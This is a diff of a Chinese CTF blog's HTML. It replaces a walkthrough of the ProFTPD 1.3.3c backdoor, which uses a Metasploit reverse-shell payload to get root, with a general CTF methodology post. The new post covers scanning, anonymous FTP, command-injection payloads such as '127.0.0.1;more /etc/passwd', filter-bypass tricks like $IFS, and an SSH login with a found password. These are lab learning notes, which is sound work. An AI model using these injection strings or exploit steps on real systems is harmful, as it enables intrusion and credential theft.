@@ -13,29 +13,35 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2024/09/11/ftp服务后门利用/"/>
+    <link rel="canonical" href="http://example.com/2024/09/11/ctf-基本思路/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="FTP服务后门利用1. 信息探测12nmap -sV IP # 扫描主机服务信息以及服务版本namp -A -v -T4 IP # 最大线程扫描主机所有信息  发现FTP服务&#x3D;&#x3D;（端口号为21）&#x3D;&#x3D; 记录FTP软件名以及版本号 2. 漏洞利用1.漏洞查找1.1SearchSploit”漏洞查找工具 “SearchSploit”是一个用于Exploit-DB的">
+        <meta name="description" content="得到flag参考思路1.信息探测1.1 扫描信息12nmap -p- -T4 IP # 探测端口namp -T4 -A -v IP # 探测全部信息   1.2 探测敏感信息1234nikto -host http:&#x2F;&#x2F;ip:portdirb http:&#x2F;&#x2F;ip:port # 探测相关目录#两种方法的port不可省略，80可省略  2.深入挖掘1.1 http服务对于大端口非htp服务，可以使用n">
 <meta property="og:type" content="article">
-<meta property="og:title" content="FTP服务后门利用">
-<meta property="og:url" content="http://example.com/2024/09/11/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:title" content="ctf 基本思路">
+<meta property="og:url" content="http://example.com/2024/09/11/ctf-%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="FTP服务后门利用1. 信息探测12nmap -sV IP # 扫描主机服务信息以及服务版本namp -A -v -T4 IP # 最大线程扫描主机所有信息  发现FTP服务&#x3D;&#x3D;（端口号为21）&#x3D;&#x3D; 记录FTP软件名以及版本号 2. 漏洞利用1.漏洞查找1.1SearchSploit”漏洞查找工具 “SearchSploit”是一个用于Exploit-DB的">
+<meta property="og:description" content="得到flag参考思路1.信息探测1.1 扫描信息12nmap -p- -T4 IP # 探测端口namp -T4 -A -v IP # 探测全部信息   1.2 探测敏感信息1234nikto -host http:&#x2F;&#x2F;ip:portdirb http:&#x2F;&#x2F;ip:port # 探测相关目录#两种方法的port不可省略，80可省略  2.深入挖掘1.1 http服务对于大端口非htp服务，可以使用n">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/1.png">
-<meta property="og:image" content="http://example.com/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/2.png">
-<meta property="og:image" content="http://example.com/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/3.png">
-<meta property="og:image" content="http://example.com/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/4.png">
-<meta property="og:image" content="http://example.com/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/5.png">
-<meta property="article:published_time" content="2024-09-11T10:18:55.000Z">
-<meta property="article:modified_time" content="2024-09-11T10:38:50.978Z">
+<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240421225824596.png">
+<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240421230533684.png">
+<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240421230548465.png">
+<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240421230609664.png">
+<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240421230829064.png">
+<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240421231124735.png">
+<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240421231432353.png">
+<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240421231528647.png">
+<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240421231904846.png">
+<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240421232215665.png">
+<meta property="article:published_time" content="2024-09-11T10:56:47.000Z">
+<meta property="article:modified_time" content="2024-09-11T11:01:42.218Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="FTP">
+<meta property="article:tag" content="simple">
+<meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/1.png">
+<meta name="twitter:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240421225824596.png">
     
     
         <!-- Google tag (gtag.js) -->
@@ -57,7 +63,7 @@
     
     <title>
         
-            FTP服务后门利用 -
+            ctf 基本思路 -
         
         Dunm1e&#39;World
     </title>
@@ -516,7 +522,7 @@
         <div class="article-title relative w-full">
             
                 <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">FTP服务后门利用</h1>
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">ctf 基本思路</h1>
                 </div>
             
             </div>
@@ -537,15 +543,15 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2024-09-11 18:18:55</span>
-        <span class="mobile">2024-09-11 18:18:55</span>
+        <span class="desktop">2024-09-11 18:56:47</span>
+        <span class="mobile">2024-09-11 18:56:47</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-09-11 18:38:50</span>
-            <span class="mobile">2024-09-11 18:38:50</span>
+            <span class="desktop">2024-09-11 19:01:42</span>
+            <span class="mobile">2024-09-11 19:01:42</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -559,7 +565,7 @@
                     
                         
                         <li>
-                            <a href="/categories/Web/">Web</a>&nbsp;
+                            <a href="/categories/ctf/">ctf</a>&nbsp;
                         </li>
                     
                     
@@ -573,7 +579,11 @@
             <ul>
                 
                     <li>
-                        <a href="/tags/FTP/">FTP</a>&nbsp;
+                        <a href="/tags/simple/">simple</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/ctf/">ctf</a>&nbsp;
                     </li>
                 
             </ul>
@@ -583,7 +593,7 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>625 Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>729 Words</span>
         </span>
     
     
@@ -607,66 +617,113 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <h1 id="FTP服务后门利用"><a href="#FTP服务后门利用" class="headerlink" title="FTP服务后门利用"></a>FTP服务后门利用</h1><h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1. 信息探测"></a>1. 信息探测</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV IP <span class="comment"># 扫描主机服务信息以及服务版本</span></span><br><span class="line">namp -A -v -T4 IP <span class="comment"># 最大线程扫描主机所有信息</span></span><br></pre></td></tr></table></figure></div>
+            <h1 id="得到flag参考思路"><a href="#得到flag参考思路" class="headerlink" title="得到flag参考思路"></a>得到flag参考思路</h1><h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1.信息探测"></a>1.信息探测</h2><h3 id="1-1-扫描信息"><a href="#1-1-扫描信息" class="headerlink" title="1.1 扫描信息"></a>1.1 扫描信息</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -T4 IP <span class="comment"># 探测端口</span></span><br><span class="line">namp -T4 -A -v IP <span class="comment"># 探测全部信息</span></span><br></pre></td></tr></table></figure></div>
 
-<p>发现FTP服务&#x3D;&#x3D;（端口号为21）&#x3D;&#x3D;</p>
-<p>记录FTP软件名以及版本号</p>
-<h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h2><h3 id="1-漏洞查找"><a href="#1-漏洞查找" class="headerlink" title="1.漏洞查找"></a>1.漏洞查找</h3><h4 id="1-1SearchSploit”漏洞查找工具"><a href="#1-1SearchSploit”漏洞查找工具" class="headerlink" title="1.1SearchSploit”漏洞查找工具"></a>1.1SearchSploit”漏洞查找工具</h4><blockquote>
-<p>“SearchSploit”是一个用于Exploit-DB的命令行搜索工具(已经默认在Kali中安装)，可以查找渗透模块。Exploit-DB是一个漏洞库，Kali Linux中保存了一个该漏洞库的拷贝，它将搜索所有的漏洞和shellcode而且该漏洞库是保存在本地的，在没有网络的情况下也可以使用。它不会包含任何文件和谷歌黑客数据库的结果。终端输入”searchsploit”启动。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240421225824596.png"
+                      alt="image-20240421225824596"
+                ></p>
+<h3 id="1-2-探测敏感信息"><a href="#1-2-探测敏感信息" class="headerlink" title="1.2 探测敏感信息"></a>1.2 探测敏感信息</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nikto -host http://ip:port</span><br><span class="line"></span><br><span class="line">dirb http://ip:port <span class="comment"># 探测相关目录</span></span><br><span class="line"><span class="comment">#两种方法的port不可省略，80可省略</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="2-深入挖掘"><a href="#2-深入挖掘" class="headerlink" title="2.深入挖掘"></a>2.深入挖掘</h2><h3 id="1-1-http服务"><a href="#1-1-http服务" class="headerlink" title="1.1 http服务"></a>1.1 http服务</h3><p><strong>对于大端口非htp服务，可以使用nc来探测该端口的banner信息</strong></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc IP port</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>对于大端口http服务，可以使用浏览器浏览界面查看源代码，寻找flag值</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip地址:端口号</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>在扫描的全部信息里寻找是否为http服务</p>
 </blockquote>
-<h4 id="1-2查找漏洞"><a href="#1-2查找漏洞" class="headerlink" title="1.2查找漏洞"></a>1.2查找漏洞</h4><p>FTP服务为“<strong>ProFTPD 1.3.3c</strong>”版本</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ProFTPD 1.3.3c</span><br></pre></td></tr></table></figure></div>
-
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/1.png"
-                      alt="图片"
+                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240421230533684.png"
+                      alt="image-20240421230533684"
                 ></p>
-<p>发现存在后门，可以尝试远程溢出。既可以通过修改对应文件中的源代码（修改某些参数）进而执行远程溢出从而利用漏洞（第一行，此方法较复杂），也可以使用Metasploit工具利用该漏洞（输出结果的第二行表示Metasploit工具已集成该漏洞）。</p>
-<p><strong>我们使用第二种方法</strong></p>
-<h3 id="2-漏洞利用-1"><a href="#2-漏洞利用-1" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p><strong>利用Metasploit进行远程溢出攻击</strong></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole  //启动Metasploit工具</span><br><span class="line">msf6 &gt; search ProFTPd-1.3.3c  //Metasploit中通过版本号查找该漏洞</span><br></pre></td></tr></table></figure></div>
-
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/2.png"
-                      alt="图片"
+                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240421230548465.png"
+                      alt="image-20240421230548465"
                 ></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/unix/ftp/proftpd_133c_backdoor  //利用exp</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show payloads  //查看可使用的挂载</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> payload cmd/unix/reverse  //选择挂载</span><br></pre></td></tr></table></figure></div>
-
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/3.png"
-                      alt="图片"
+                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240421230609664.png"
+                      alt="image-20240421230609664"
                 ></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options  //显示参数（输入时可用tab键补全）</span><br></pre></td></tr></table></figure></div>
-
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/4.png"
-                      alt="图片"
+                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240421230829064.png"
+                      alt="image-20240421230829064"
                 ></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> rhost 192.168.43.174  //设置靶机ip</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> lhost 192.168.43.40  //设置攻击机ip</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options  //显示参数</span><br></pre></td></tr></table></figure></div>
-
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; exploit  //开始利用漏洞</span><br></pre></td></tr></table></figure></div>
-
+<p><strong>对于http服务，打开相关敏感页面，查看敏感信息，找到可利用的位置（包括80端口）</strong></p>
+<p><strong>&#x3D;&#x3D;注意之前用dirb和nikto扫描出来的目录&#x3D;&#x3D;</strong></p>
+<p> <img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240421231124735.png"
+                      alt="image-20240421231124735"
+                ></p>
+<p>注意到flag.txt，打开获得flag</p>
+<p>并且这里有个passwords.html，打开发现没有什么，但是我们&#x3D;&#x3D;查看源代码&#x3D;&#x3D;，<strong>发现一个password：Winter</strong>，记录下来</p>
+<h3 id="1-2-FTP服务"><a href="#1-2-FTP服务" class="headerlink" title="1.2 FTP服务"></a>1.2 FTP服务</h3><p><strong>FTP 匿名登陆 挖掘敏感信息</strong></p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/5.png"
-                      alt="图片"
+                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240421231432353.png"
+                     
                 ></p>
-<p>成功拿到反弹shell，且当前账户拥有root权限。（注：最后一句提示“Command shell session 1 opened”说明会话已经开启，并且下面出现光标，此时即可输入指令。）<br><strong>但是此会话跟终端有区别，于是我们优化终端</strong></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span>  //优化终端</span><br></pre></td></tr></table></figure></div>
+<p>在浏览器输入</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp://IP</span><br></pre></td></tr></table></figure></div>
 
-<h3 id="3-获取flag"><a href="#3-获取flag" class="headerlink" title="3.获取flag"></a>3.获取flag</h3><p>一般flag在根目录也就是&#x2F;root中</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root  //进入root目录</span><br><span class="line"><span class="built_in">ls</span>  //查看当前目录（文件夹）中文件列表</span><br><span class="line"><span class="built_in">cat</span> flag  //打开flag文件</span><br></pre></td></tr></table></figure></div>
+<p> 匿名登录ftp服务器根目录</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240421231528647.png"
+                      alt="image-20240421231528647"
+                ></p>
+<p>发现flag</p>
+<p><strong>然后在站点robots.txt文件中寻找敏感文件目录，挖掘漏洞（在扫描的信息中查看）</strong></p>
+<p>&#x3D;&#x3D;注意：对于命令执行，为了绕过对应的限制，可以使用相近命令&#x3D;&#x3D;</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat -&gt; more</span><br></pre></td></tr></table></figure></div>
 
-<p>成功获取flag</p>
+<p>然后依次打开robots.txt中的目录</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240421231904846.png"
+                      alt="image-20240421231904846"
+                ></p>
+<p>发现命令执行窗口</p>
+<p>于是想到命令注入</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;id</span><br><span class="line"></span><br><span class="line">127.0.0.1;more /etc/passwd # cat不能用</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>1、命令注入我们要防备其对于一些符号的过滤导致我们不能成功注入，所以我们要多了解一些符号。<br>2、;直接分号分隔<br>管道符：作用和&amp;一样。前面和后面命令都要执行，无论前面真假<br>3、| 按位或<br>作用是直接执行|后面的语句<br>4、|| 逻辑或<br>作用是如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>5、&amp; 按位与<br>&amp;前面和后面命令都要执行，无论前面真假<br>6、&amp;&amp; 逻辑与<br>如果前面为假，后面的命令就不执行，如果前面为真则再执行后面命令，这样两条命令都会被执行</p>
+</blockquote>
+<p>找到在home下的用户Summer</p>
+<p>然后利用ssh远程连接</p>
+<p>但是发现无法直接连接，看到扫描的端口号有个22222端口</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240421232215665.png"
+                      alt="image-20240421232215665"
+                ></p>
+<p>于是利用这个端口进行连接</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 22222 Summer@IP</span><br><span class="line"><span class="comment">#输入密码 Winter</span></span><br></pre></td></tr></table></figure></div>
+
+<p>于是得到反弹shell</p>
+<p>利用pwd ls cat more等命令</p>
+<p>查看flag</p>
+<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>空格绕过：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //1 改 成 1改成1改成加其他数字貌似都行</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
 
         </div>
 
@@ -674,18 +731,18 @@
             <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> FTP服务后门利用</li>
+        <li><strong>Title:</strong> ctf 基本思路</li>
         <li><strong>Author:</strong> Dunm1e</li>
         <li><strong>Created at
-                :</strong> 2024-09-11 18:18:55</li>
+                :</strong> 2024-09-11 18:56:47</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-09-11 18:38:50
+                    :</strong> 2024-09-11 19:01:42
             </li>
         
         <li>
-            <strong>Link:</strong> https://dunm1e.github.io/2024/09/11/FTP服务后门利用/
+            <strong>Link:</strong> https://dunm1e.github.io/2024/09/11/ctf-基本思路/
         </li>
         <li>
             <strong>
@@ -707,7 +764,11 @@
             <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                 
                     <li class="tag-item mx-0.5">
-                        <a href="/tags/FTP/">#FTP</a>&nbsp;
+                        <a href="/tags/simple/">#simple</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/ctf/">#ctf</a>&nbsp;
                     </li>
                 
             </ul>
@@ -721,13 +782,13 @@
                     <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="prev"
                         rel="prev"
-                        href="/2024/09/11/SambaSMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88Serve-Message-Block/"
+                        href="/2024/09/11/%E4%B8%87%E8%83%BD%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81/"
                         >
                             <span class="left arrow-icon flex justify-center items-center">
                                 <i class="fa-solid fa-chevron-left"></i>
                             </span>
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">SambaSMB信息泄露（Serve Message Block)</span>
+                                <span class="post-nav-title-item">万能登陆密码</span>
                                 <span class="post-nav-item">Prev posts</span>
                             </span>
                         </a>
@@ -737,10 +798,10 @@
                     <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="next"
                         rel="next"
-                        href="/2024/09/11/hello-world/"
+                        href="/2024/09/11/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88SSRF%EF%BC%89/"
                         >
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">Hello World</span>
+                                <span class="post-nav-title-item">服务器请求伪造（SSRF）</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex justify-center items-center">
@@ -761,8 +822,8 @@
             <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">On this page</div>
-        <div class="page-title">FTP服务后门利用</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8"><span class="nav-text">FTP服务后门利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B"><span class="nav-text">1. 信息探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">2. 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%BC%8F%E6%B4%9E%E6%9F%A5%E6%89%BE"><span class="nav-text">1.漏洞查找</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="nav-text">2.漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E8%8E%B7%E5%8F%96flag"><span class="nav-text">3.获取flag</span></a></li></ol></li></ol></li></ol>
+        <div class="page-title">ctf 基本思路</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BE%97%E5%88%B0flag%E5%8F%82%E8%80%83%E6%80%9D%E8%B7%AF"><span class="nav-text">得到flag参考思路</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B"><span class="nav-text">1.信息探测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E6%89%AB%E6%8F%8F%E4%BF%A1%E6%81%AF"><span class="nav-text">1.1 扫描信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E6%8E%A2%E6%B5%8B%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="nav-text">1.2 探测敏感信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%B7%B1%E5%85%A5%E6%8C%96%E6%8E%98"><span class="nav-text">2.深入挖掘</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-http%E6%9C%8D%E5%8A%A1"><span class="nav-text">1.1 http服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-FTP%E6%9C%8D%E5%8A%A1"><span class="nav-text">1.2 FTP服务</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="nav-text">知识点：</span></a></li></ol></li></ol>
 
     </div>
 </div>
